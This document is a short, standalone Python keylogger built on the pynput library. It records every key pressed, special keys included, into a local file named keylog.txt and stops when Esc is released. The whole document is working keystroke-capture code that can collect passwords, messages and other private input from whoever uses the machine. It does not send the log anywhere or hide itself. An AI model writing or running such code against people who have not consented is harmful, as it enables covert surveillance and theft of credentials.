from pynput import keyboard

# Define the file where we want to store the keystrokes
log_file = "keylog.txt"

# Function to be called when a key is pressed
def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(str(key.char))
    except AttributeError:
        with open(log_file, "a") as f:
            if key == keyboard.Key.space:
                f.write(' ')
            elif key == keyboard.Key.enter:
                f.write('\n')
            elif key == keyboard.Key.tab:
                f.write('\t')
            elif key == keyboard.Key.backspace:
                f.write('[BACKSPACE]')
            elif key == keyboard.Key.esc:
                f.write('[ESC]')
            else:
                f.write(f'[{key}]')

# Function to be called when a key is released
def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener
        return False

# Start listening to keystrokes
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
